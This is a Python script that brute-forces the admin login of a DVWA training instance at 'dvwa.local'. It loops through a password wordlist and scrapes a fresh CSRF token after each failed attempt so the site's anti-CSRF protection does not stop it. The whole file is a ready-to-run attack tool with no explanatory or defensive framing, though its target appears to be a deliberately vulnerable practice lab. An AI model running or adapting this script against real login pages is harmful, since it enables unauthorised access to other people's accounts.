from sys import argv
import requests
from bs4 import BeautifulSoup as Soup

# give our arguments more semantic friendly names
script, filename, success_message = "main.py", "words.txt", "Welcome to the password protected area admin"
txt = open(filename)

# set up our target, cookie and session
url = 'http://dvwa.local/vulnerabilities/brute/index.php'
cookie = {'security': 'high', 'PHPSESSID': '45ugmsokssphm3297s9kc5ke8d'}
s = requests.Session()
target_page = s.get(url, cookies=cookie)

''' 
checkSuccess
@param: html (String)

Searches the response HTML for our specified success message
'''


def checkSuccess(html):
    # get our soup ready for searching
    soup = Soup(html)
    # check for our success message in the soup
    search = soup.findAll(text=success_message)

    if not search:
        success = False

    else:
        success = True

    # return the brute force result
    return success


# Get the intial CSRF token from the target site
page_source = target_page.text
soup = Soup(page_source);
csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')

# Display before attack
print('DVWA URL' + url)
print('CSRF Token=' + csrf_token)

# Loop through our provided password file
with open(filename) as f:
    print('Running brute force attack...')
    for password in f:

        # Displays password tries and strips whitespace from password list
        password = password.strip()

        # setup the payload
        payload = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
        r = s.get(url, cookies=cookie, params=payload)
        success = checkSuccess(r.text)

        if not success:
            # if it failed the CSRF token will be changed. Get the new one
            soup = Soup(r.text)
            csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
        else:
            # Success! Show the result
            print('Success! Password is: ' + password)
            break

    # We failed, bummer.
    if not success:
        print('Brute force failed. No matches found.')